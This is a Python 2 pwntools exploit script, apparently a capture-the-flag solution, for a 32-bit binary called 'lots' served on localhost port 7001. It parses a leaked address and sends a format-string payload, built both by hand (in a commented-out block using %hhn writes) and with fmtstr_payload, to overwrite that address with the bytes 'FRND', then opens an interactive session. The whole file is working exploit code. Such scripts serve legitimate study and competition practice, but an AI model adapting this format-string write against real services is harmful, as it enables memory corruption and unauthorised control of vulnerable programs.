#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./lots --host localhost --port 7001
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./lots')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'localhost'
port = int(args.PORT or 7001)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x56556315
break *0x565563ce
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      PIE enabled
# RWX:      Has RWX segments

io = start()
line1 = io.recvline()
door_addr_string = line1[len('A door blocks your path at '):]
print 'FRND @ '+door_addr_string
line2 = io.recvline()
print line2
line3 = io.recvuntil('enter:')
print line3

#payload = 'eabcd'+'%7$x'

payload = 'a'
'''
payload += p32(int(door_addr_string,16) + 0)
payload += p32(int(door_addr_string,16) + 1)
payload += p32(int(door_addr_string,16) + 2)
payload += p32(int(door_addr_string,16) + 3)

byte1 = 70 - len(payload)	#F
byte2 = 82 - len(payload)	- byte1	#R
byte3 = 334 - len(payload)	- byte1	- byte2	#N
byte4 = 4420 - len(payload)	- byte1	- byte2	- byte3	#D

#print str(byte1)+'<->'+str(byte2)+'<->'+str(byte3)+'<->'+str(byte4)

payload += '%'+str(byte1)+'x'+'%7$hhn'+'%'+str(byte2)+'x'+'%8$hhn'+'%'+str(byte3)+'x'+'%9$hhn'+'%'+str(byte4)+'x'+'%10$hhn'
'''
payload += fmtstr_payload(7, {int(door_addr_string,16): 0x444e5246}, 1, 'byte')
print payload

io.sendline(payload)
io.interactive()
